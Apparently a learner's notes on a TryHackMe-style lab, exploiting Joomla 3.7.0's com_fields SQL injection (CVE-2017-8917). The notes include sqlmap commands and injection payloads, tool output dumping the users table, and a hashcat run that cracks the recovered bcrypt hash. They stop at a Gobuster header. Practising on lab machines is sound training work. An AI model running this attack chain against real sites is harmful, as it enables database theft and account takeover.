OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 247.85 seconds

--------------------------------------------------------------

Initial Thoughts:
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-vuln-cve2017-8917: 
|   VULNERABLE:
|   Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-8917
|     Risk factor: High  CVSSv3: 9.8 

This was interesting maybe I can do more to verify Joomla version I tried inputting ' to induce an error or or like  a ' OR True;-- which also failed. It also detected 3306 Maria DB 10.3.23 or earlier on mysql 

inspecting the page made me find this directory in the HTML /index.php/component/users/?Itemid=101" this may be querying a backend database

-------------------------------------------------------------------

msf6 auxiliary(scanner/http/joomla_version) > set RHOSTS 10.10.132.218
RHOSTS => 10.10.132.218
msf6 auxiliary(scanner/http/joomla_version) > set TARGETURI /administrator/
TARGETURI => /administrator/
msf6 auxiliary(scanner/http/joomla_version) > run
[*] Server: Apache/2.4.6 (CentOS) PHP/5.6.40
[+] Joomla version: 3.7.0
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/joomla_version) > 

---------------------------------------------------------------------
used metasploit aux scanner to confirm joomla version
then tested some joomla 3.7.0 exploits I see because I can't get the SQLmap version nor this RCE to work

https://www.exploit-db.com/exploits/42033

I then found someone who ran a different command for SQL map WHICH I STILL NEED TO TRY


command: sqlmap -u "http://192.168.1.14/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --dump --batch

I now tried the command (go back and read your notes). The command didn't work. I tried again a day later and it actually found things.

it outputted

--------------------------------------------------------------------------

available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test
-------------------------------------------------------------------------------------------------------------
so I now want to enumerate the tables in the joomla database 
----------------------------------------------------------------------------------------------------------
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://10.10.74.3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla --tables
        ___
       __H__                                                                                                                                          
 ___ ___[)]_____ ___ ___  {1.9.2#stable}                                                                                                              
|_ -| . [,]     | .'| . |                                                                                                                             
|___|_  [,]_|_|_|__,|  _|                                                                                                                             
      |_|V...       |_|   https://sqlmap.org                                                                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:24:47 /2025-04-25/

[14:24:48] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                                            
[14:24:48] [INFO] resuming back-end DBMS 'mysql' 
[14:24:48] [INFO] testing connection to the target URL
[14:24:48] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=71sci5vi860...pq698ah107'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9872 FROM(SELECT COUNT(*),CONCAT(0x716b787071,(SELECT (ELT(9872=9872,1))),0x7176626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7632 FROM (SELECT(SLEEP(5)))XhkY)
---
[14:24:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 7
web application technology: Apache 2.4.6, PHP 5.6.40
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[14:24:50] [INFO] fetching database names
[14:24:50] [INFO] resumed: 'information_schema'
[14:24:50] [INFO] resumed: 'joomla'
[14:24:50] [INFO] resumed: 'mysql'
[14:24:50] [INFO] resumed: 'performance_schema'
[14:24:50] [INFO] resumed: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

[14:24:50] [INFO] fetching tables for database: 'joomla'
[14:24:51] [INFO] retrieved: '#__assets'
[14:24:51] [INFO] retrieved: '#__associations'
[14:24:51] [INFO] retrieved: '#__banner_clients'
[14:24:52] [INFO] retrieved: '#__banner_tracks'
[14:24:52] [INFO] retrieved: '#__banners'
[14:24:52] [INFO] retrieved: '#__categories'
[14:24:52] [INFO] retrieved: '#__contact_details'
[14:24:52] [INFO] retrieved: '#__content'
[14:24:53] [INFO] retrieved: '#__content_frontpage'
[14:24:53] [INFO] retrieved: '#__content_rating'
[14:24:53] [INFO] retrieved: '#__content_types'
[14:24:53] [INFO] retrieved: '#__contentitem_tag_map'
[14:24:53] [INFO] retrieved: '#__core_log_searches'
[14:24:54] [INFO] retrieved: '#__extensions'
[14:24:54] [INFO] retrieved: '#__fields'
[14:24:54] [INFO] retrieved: '#__fields_categories'
[14:24:54] [INFO] retrieved: '#__fields_groups'
[14:24:54] [INFO] retrieved: '#__fields_values'
[14:24:55] [INFO] retrieved: '#__finder_filters'
[14:24:55] [INFO] retrieved: '#__finder_links'
[14:24:55] [INFO] retrieved: '#__finder_links_terms0'
[14:24:55] [INFO] retrieved: '#__finder_links_terms1'
[14:24:55] [INFO] retrieved: '#__finder_links_terms2'
[14:24:56] [INFO] retrieved: '#__finder_links_terms3'
[14:24:56] [INFO] retrieved: '#__finder_links_terms4'
[14:24:56] [INFO] retrieved: '#__finder_links_terms5'
[14:24:56] [INFO] retrieved: '#__finder_links_terms6'
[14:24:56] [INFO] retrieved: '#__finder_links_terms7'
[14:24:57] [INFO] retrieved: '#__finder_links_terms8'
[14:24:57] [INFO] retrieved: '#__finder_links_terms9'
[14:24:57] [INFO] retrieved: '#__finder_links_termsa'
[14:24:57] [INFO] retrieved: '#__finder_links_termsb'
[14:24:57] [INFO] retrieved: '#__finder_links_termsc'
[14:24:58] [INFO] retrieved: '#__finder_links_termsd'
[14:24:58] [INFO] retrieved: '#__finder_links_termse'
[14:24:58] [INFO] retrieved: '#__finder_links_termsf'
[14:24:58] [INFO] retrieved: '#__finder_taxonomy'
[14:24:58] [INFO] retrieved: '#__finder_taxonomy_map'
[14:24:59] [INFO] retrieved: '#__finder_terms'
[14:24:59] [INFO] retrieved: '#__finder_terms_common'
[14:24:59] [INFO] retrieved: '#__finder_tokens'
[14:24:59] [INFO] retrieved: '#__finder_tokens_aggregate'
[14:24:59] [INFO] retrieved: '#__finder_types'
[14:25:00] [INFO] retrieved: '#__languages'
[14:25:00] [INFO] retrieved: '#__menu'
[14:25:00] [INFO] retrieved: '#__menu_types'
[14:25:00] [INFO] retrieved: '#__messages'
[14:25:00] [INFO] retrieved: '#__messages_cfg'
[14:25:01] [INFO] retrieved: '#__modules'
[14:25:01] [INFO] retrieved: '#__modules_menu'
[14:25:01] [INFO] retrieved: '#__newsfeeds'
[14:25:01] [INFO] retrieved: '#__overrider'
[14:25:01] [INFO] retrieved: '#__postinstall_messages'
[14:25:02] [INFO] retrieved: '#__redirect_links'
[14:25:02] [INFO] retrieved: '#__schemas'
[14:25:02] [INFO] retrieved: '#__session'
[14:25:02] [INFO] retrieved: '#__tags'
[14:25:02] [INFO] retrieved: '#__template_styles'
[14:25:03] [INFO] retrieved: '#__ucm_base'
[14:25:03] [INFO] retrieved: '#__ucm_content'
[14:25:03] [INFO] retrieved: '#__ucm_history'
[14:25:03] [INFO] retrieved: '#__update_sites'
[14:25:03] [INFO] retrieved: '#__update_sites_extensions'
[14:25:04] [INFO] retrieved: '#__updates'
[14:25:04] [INFO] retrieved: '#__user_keys'
[14:25:04] [INFO] retrieved: '#__user_notes'
[14:25:04] [INFO] retrieved: '#__user_profiles'
[14:25:04] [INFO] retrieved: '#__user_usergroup_map'
[14:25:05] [INFO] retrieved: '#__usergroups'
[14:25:05] [INFO] retrieved: '#__users'
[14:25:05] [INFO] retrieved: '#__utf8_conversion'
[14:25:05] [INFO] retrieved: '#__viewlevels'
Database: joomla
[72 tables]
+----------------------------+
| #__assets                  |
| #__associations            |
| #__banner_clients          |
| #__banner_tracks           |
| #__banners                 |
| #__categories              |
| #__contact_details         |
| #__content_frontpage       |
| #__content_rating          |
| #__content_types           |
| #__content                 |
| #__contentitem_tag_map     |
| #__core_log_searches       |
| #__extensions              |
| #__fields_categories       |
| #__fields_groups           |
| #__fields_values           |
| #__fields                  |
| #__finder_filters          |
| #__finder_links_terms0     |
| #__finder_links_terms1     |
| #__finder_links_terms2     |
| #__finder_links_terms3     |
| #__finder_links_terms4     |
| #__finder_links_terms5     |
| #__finder_links_terms6     |
| #__finder_links_terms7     |
| #__finder_links_terms8     |
| #__finder_links_terms9     |
| #__finder_links_termsa     |
| #__finder_links_termsb     |
| #__finder_links_termsc     |
| #__finder_links_termsd     |
| #__finder_links_termse     |
| #__finder_links_termsf     |
| #__finder_links            |
| #__finder_taxonomy_map     |
| #__finder_taxonomy         |
| #__finder_terms_common     |
| #__finder_terms            |
| #__finder_tokens_aggregate |
| #__finder_tokens           |
| #__finder_types            |
| #__languages               |
| #__menu_types              |
| #__menu                    |
| #__messages_cfg            |
| #__messages                |
| #__modules_menu            |
| #__modules                 |
| #__newsfeeds               |
| #__overrider               |
| #__postinstall_messages    |
| #__redirect_links          |
| #__schemas                 |
| #__session                 |
| #__tags                    |
| #__template_styles         |
| #__ucm_base                |
| #__ucm_content             |
| #__ucm_history             |
| #__update_sites_extensions |
| #__update_sites            |
| #__updates                 |
| #__user_keys               |
| #__user_notes              |
| #__user_profiles           |
| #__user_usergroup_map      |
| #__usergroups              |
| #__users                   |
| #__utf8_conversion         |
| #__viewlevels              |
+----------------------------+

[14:25:05] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 74 times
[14:25:05] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.74.3'
I

finding the #__users table pretty interesting I looked into that

┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://10.10.151.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" --columns
        ___
       __H__                                                                                                                                          
 ___ ___["]_____ ___ ___  {1.9.2#stable}                                                                                                              
|_ -| . [)]     | .'| . |                                                                                                                             
|___|_  [)]_|_|_|__,|  _|                                                                                                                             
      |_|V...       |_|   https://sqlmap.org                                                                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:25:04 /2025-04-25/

[16:25:04] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.11 Safari/535.19' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                              
[16:25:04] [INFO] testing connection to the target URL
[16:25:08] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=t7vvcpp79q5...vd8i2jqsu4'). Do you want to use those [Y/n] y
[16:25:10] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:25:11] [INFO] testing if the target URL content is stable
[16:25:11] [INFO] target URL content is stable
[16:25:11] [INFO] heuristic (basic) test shows that GET parameter 'list[fullordering]' might be injectable (possible DBMS: 'MySQL')
[16:25:11] [INFO] testing for SQL injection on GET parameter 'list[fullordering]'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
[16:25:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:25:13] [WARNING] reflective value(s) found and filtering out
[16:25:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[16:25:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[16:26:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[16:27:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[16:28:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[16:29:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[16:29:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[16:30:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[16:30:04] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[16:30:05] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[16:30:05] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[16:30:06] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[16:30:06] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[16:31:03] [INFO] testing 'Generic inline queries'
[16:31:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[16:31:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[16:32:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[16:33:13] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[16:34:31] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[16:35:05] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[16:36:20] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[16:37:45] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[16:38:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:40:24] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:42:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[16:42:05] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[16:42:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[16:42:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[16:42:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[16:42:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[16:42:16] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[16:42:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[16:42:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[16:42:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[16:42:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[16:43:18] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[16:43:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[16:44:13] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[16:44:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[16:45:13] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[16:46:09] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[16:47:05] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[16:48:02] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[16:48:57] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[16:49:52] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:50:48] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:51:44] [INFO] testing 'MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:51:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:52:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:53:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[16:54:32] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[16:54:57] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:55:33] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[16:56:28] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[16:56:55] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[16:57:33] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[16:57:34] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[16:57:35] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[16:57:36] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[16:57:37] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[16:57:38] [INFO] GET parameter 'list[fullordering]' is 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' injectable 
[16:57:38] [INFO] testing 'MySQL inline queries'
[16:57:39] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[16:57:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[16:57:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[16:57:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[16:57:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[16:57:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[16:57:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:57:47] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[16:57:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[16:57:49] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[16:57:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[16:57:51] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[16:57:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[16:57:53] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[16:57:54] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[16:57:55] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[16:57:56] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[16:57:57] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[16:57:58] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[16:57:59] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[16:58:00] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[16:58:01] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[16:58:03] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[16:58:04] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[16:58:05] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[16:58:06] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[16:58:07] [INFO] testing 'MySQL AND time-based blind (ELT)'
[16:58:08] [INFO] testing 'MySQL OR time-based blind (ELT)'
[16:58:09] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[16:58:10] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[16:58:11] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[16:58:12] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[16:58:13] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[16:58:14] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[16:58:27] [INFO] GET parameter 'list[fullordering]' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' injectable 
[16:58:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:58:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:58:49] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[16:59:11] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[16:59:31] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[16:59:50] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[16:59:53] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[16:59:58] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[17:00:04] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[17:00:25] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[17:00:46] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[17:01:06] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[17:01:29] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[17:01:50] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[17:02:12] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[17:02:32] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[17:02:53] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[17:03:14] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[17:03:34] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[17:03:55] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[17:04:15] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'list[fullordering]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 2746 HTTP(s) requests:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2528 FROM(SELECT COUNT(*),CONCAT(0x717a766271,(SELECT (ELT(2528=2528,1))),0x716a6b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 4741 FROM (SELECT(SLEEP(5)))gIGU)
---
[18:14:46] [INFO] the back-end DBMS is MySQL
[18:14:46] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
web server operating system: Linux CentOS 7
web application technology: PHP 5.6.40, Apache 2.4.6
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[18:14:48] [INFO] fetching database names
[18:14:48] [INFO] retrieved: 'information_schema'
[18:14:48] [INFO] retrieved: 'joomla'
[18:14:48] [INFO] retrieved: 'mysql'
[18:14:49] [INFO] retrieved: 'performance_schema'
[18:14:49] [INFO] retrieved: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

[18:14:49] [INFO] fetching columns for table '#__users' in database 'joomla'
[18:14:49] [WARNING] unable to retrieve column names for table '#__users' in database 'joomla'
do you want to use common column existence check? [y/N/q] y
[18:14:52] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
[2] custom
> 1
[18:14:56] [INFO] checking column existence using items from '/usr/share/sqlmap/data/txt/common-columns.txt'
[18:14:56] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 

[18:15:00] [WARNING] running in a single-thread mode. This could take a while
[18:15:00] [INFO] retrieved: id                                                                                                                      
[18:15:00] [INFO] retrieved: name                                                                                                                    
[18:15:01] [INFO] retrieved: username                                                                                                                
[18:15:04] [INFO] retrieved: email                                                                                                                   
[18:15:36] [INFO] retrieved: password                                                                                                                
[18:21:56] [INFO] retrieved: params                                                                                                                  
Table: joomla.#__users
[6 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| name     | non-numeric |
| email    | non-numeric |
| id       | numeric     |
| params   | numeric     |
| password | non-numeric |
| username | non-numeric |
+----------+-------------+

--------------------------------------------------------------------
we now have columns password and username
so we can search for them with the following sql map commands:

 sqlmap -u "http://10.10.151.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" -C username --dump

which outputted the following:

[20:18:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 7
web application technology: Apache 2.4.6, PHP 5.6.40
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:18:34] [INFO] fetching database names
[20:18:34] [INFO] resumed: 'information_schema'
[20:18:34] [INFO] resumed: 'joomla'
[20:18:34] [INFO] resumed: 'mysql'
[20:18:34] [INFO] resumed: 'performance_schema'
[20:18:34] [INFO] resumed: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

[20:18:34] [INFO] fetching entries of column(s) 'username' for table '#__users' in database 'joomla'
[20:18:35] [INFO] retrieved: 'jonah'
Database: joomla
Table: #__users
[1 entry]
+----------+
| username |
+----------+
| jonah    |
+----------+

here we see a jonah user

 sqlmap -u "http://10.10.151.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" -C password --dump

-----------------------------------------
which outputted the following:
[20:13:26] [INFO] retrieved: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

[20:13:26] [INFO] fetching entries of column(s) 'password' for table '#__users' in database 'joomla'
[20:13:26] [INFO] retrieved: '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
Database: joomla
Table: #__users
[1 entry]
+--------------------------------------------------------------+
| password                                                     |
+--------------------------------------------------------------+
| $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
+--------------------------------------------------------------+

[20:13:26] [INFO] table 'joomla.`#__users`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.116.31/dump/joomla/#__users.csv'
[20:13:26] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2712 times
[20:13:26] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.116.31'

[*] ending @ 20:13:26 /2025-04-28/


this has was used to find the password:

┌──(kali㉿kali)-[~]
└─$ hashcat -m 3200 hash.txt ~/Desktop/rockyou.txt --show
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123

---------------------------------------------------------------------
here we have a hash in the passwords column  SQL map found
-------------------------------------------------------------------------

there is also this script I found which did the same thing

https://github.com/teranpeterson/Joomblah/blob/master/joomblah.py

┌──(kali㉿kali)-[~/Joomblah]
└─$ python3 joomblah.py 10.10.116.31:80
/home/kali/Joomblah/joomblah.py:208: SyntaxWarning: invalid escape sequence '\ '
  logo = """

WARNING: URL protocol not provided. Assuming http.
Fetching CSRF token
Testing SQLi
Found table: fb9j5_users
Extracting users from fb9j5_users
Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']


Extracting sessions from fb9j5_session

gubuster scan
------------------------------------------------------------------------------------------------------------
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
